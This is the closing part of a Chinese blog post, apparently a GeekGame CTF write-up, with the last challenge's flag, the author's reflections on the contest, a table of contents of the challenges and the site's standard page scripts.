+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pYthOn_RAnd0M_sOo000oO0oOoO0OooO000_easY&#125;</span><br></pre></td></tr></table></figure>
+
+<p>啊？啊？？啊？？？</p>
+<img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/smgg.jpg" style="zoom:50%;" />
+
+
+
+
+
+
+
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p><del>一些废话</del></p>
+<p>没想到一眨眼已经变成三年老选手了。还记得第一届的时候被安利了GeekGame，虽然当时完全是0基础，但也玩的很开心<del>一不小心捞了个3&#x3D;</del>。当时“叶子的新歌”这道题给我留下了很深的印象，我一直很喜欢那道题（向出题的MaxXing老师致敬），而那道题也让我把这场原本想要随便打打的比赛坚持着打完了。结果一下子就入坑了（笑）</p>
+<p>GeekGame是我唯一接触过的CTF比赛，从一个划水选手的角度来看，感觉CTF和别的（比如OI）的比赛还是挺有区别的，不仅要有超大的脑洞，还要有较强的信息检索能力和快速学习新信息的能力。感觉比起做题更像是解谜（笑）是很有趣的体验。</p>
+<p><del>前两年因为实力有限只拿了3&#x3D;</del>，今年比较闲，就尝试着All in了一把<del>不小心通了几个宵</del>，拿到了令自己感到意外的排名。见证了自己的微小的成长，真的是挺令人高兴的事。</p>
+<p>榜上还有许多id很熟悉的老哥，每年都能见到他们，感觉他们都强的离谱😳<del>怎么什么b题都会做</del>。感觉每年能够读他们的Writeup，从里面get一些idea，也是一件非常有收获的事。</p>
+<p>最后希望GeekGame越办越好，他真的给了我很快乐的参赛体验，我也希望接下来还能看到更多更有趣的题目。<strong>一生、GeekGameしでくれる</strong>😭😭😭</p>
+<img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/lulu.jpg" style="zoom:50%;" />
+
+<blockquote>
+<p>关注 <a target="_blank" rel="noopener" href="https://space.bilibili.com/387636363">@雫るる_Official</a>谢谢喵~</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/25/%E7%BC%96%E5%8E%9F-KMP-AC-Automaton/" rel="prev" title="编原 | KMP & AC Automaton">
+      <i class="fa fa-chevron-left"></i> 编原 | KMP & AC Automaton
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E7%9C%BC%E7%9B%AF%E5%B8%A7"><span class="nav-number">1.</span> <span class="nav-text">一眼盯帧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E5%8C%97%E9%97%AE%E7%AD%94"><span class="nav-number">2.</span> <span class="nav-text">小北问答!!!!!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Z-%E5%85%AC%E5%8F%B8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">Z 公司的服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8A%9F"><span class="nav-number">4.</span> <span class="nav-text">基本功</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1"><span class="nav-number">4.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2"><span class="nav-number">4.2.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dark-Room"><span class="nav-number">5.</span> <span class="nav-text">Dark Room</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-1"><span class="nav-number">5.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-1"><span class="nav-number">5.2.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BA%A6%E6%81%A9%C2%B7%E5%BA%93%E6%8B%89%E5%A4%AB%E7%89%B9"><span class="nav-number">6.</span> <span class="nav-text">麦恩·库拉夫特</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-flag2"><span class="nav-number">6.1.</span> <span class="nav-text">flag1 &amp; flag2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3-failed"><span class="nav-number">6.2.</span> <span class="nav-text">flag3(failed)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Emoji-Wordle"><span class="nav-number">7.</span> <span class="nav-text">Emoji Wordle</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-2"><span class="nav-number">7.1.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-2"><span class="nav-number">7.2.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3-failed-1"><span class="nav-number">7.3.</span> <span class="nav-text">flag3(failed)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B0XSS"><span class="nav-number">8.</span> <span class="nav-text">第三新XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-3"><span class="nav-number">8.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-failed"><span class="nav-number">8.2.</span> <span class="nav-text">flag2(failed)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%89%93%E5%AD%97%E7%A8%BF"><span class="nav-number">9.</span> <span class="nav-text">简单的打字稿</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-4"><span class="nav-number">9.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-3"><span class="nav-number">9.2.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E6%B3%95%E6%89%80%E5%BE%97"><span class="nav-number">10.</span> <span class="nav-text">非法所得</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3"><span class="nav-number">10.1.</span> <span class="nav-text">flag3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-5"><span class="nav-number">10.2.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-4"><span class="nav-number">10.3.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B1%89%E5%8C%96%E7%BB%BF%E8%89%B2%E7%89%88%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD"><span class="nav-number">11.</span> <span class="nav-text">汉化绿色版免费下载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-6"><span class="nav-number">11.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-5"><span class="nav-number">11.2.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E5%AD%A6C%E8%AF%AD%E8%A8%80"><span class="nav-number">12.</span> <span class="nav-text">初学C语言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-7"><span class="nav-number">12.1.</span> <span class="nav-text">flag1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%9D%E5%A6%99%E7%9A%84%E5%A4%9A%E9%A1%B9%E5%BC%8F"><span class="nav-number">13.</span> <span class="nav-text">绝妙的多项式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-8"><span class="nav-number">13.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-6"><span class="nav-number">13.2.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3-1"><span class="nav-number">13.3.</span> <span class="nav-text">flag3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4%E5%96%B5%EF%BC%8C%E8%B0%A2%E8%B0%A2%E5%96%B5"><span class="nav-number">14.</span> <span class="nav-text">关键词过滤喵，谢谢喵</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-9"><span class="nav-number">14.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-7"><span class="nav-number">14.2.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3-2"><span class="nav-number">14.3.</span> <span class="nav-text">flag3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E6%9D%A5%E7%A3%81%E7%9B%98"><span class="nav-number">15.</span> <span class="nav-text">未来磁盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-10"><span class="nav-number">15.1.</span> <span class="nav-text">flag1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%AB%A0%E9%B1%BC%E7%9A%84%E6%9B%B2%E5%A5%87"><span class="nav-number">16.</span> <span class="nav-text">小章鱼的曲奇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1-11"><span class="nav-number">16.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2-8"><span class="nav-number">16.2.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag3-3"><span class="nav-number">16.3.</span> <span class="nav-text">flag3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">17.</span> <span class="nav-text">写在最后</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="GCC314"
+      src="/images/g-avatar.jpg">
+  <p class="site-author-name" itemprop="name">GCC314</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gcc314" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gcc314" rel="noopener" target="_blank"><i class="github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:gcc314@stu.pku.edu.cn" title="E-Mail → mailto:gcc314@stu.pku.edu.cn" rel="noopener" target="_blank"><i class="envelope fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/chen-guo-si" title="Zhihu → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;chen-guo-si" rel="noopener" target="_blank"><i class="quote-left fa-fw"></i></a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://zisu.dev/" title="https:&#x2F;&#x2F;zisu.dev&#x2F;" rel="noopener" target="_blank">Zisu Zhang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://skylee.xyz/" title="https:&#x2F;&#x2F;skylee.xyz&#x2F;" rel="noopener" target="_blank">Skylee</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">GCC314</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
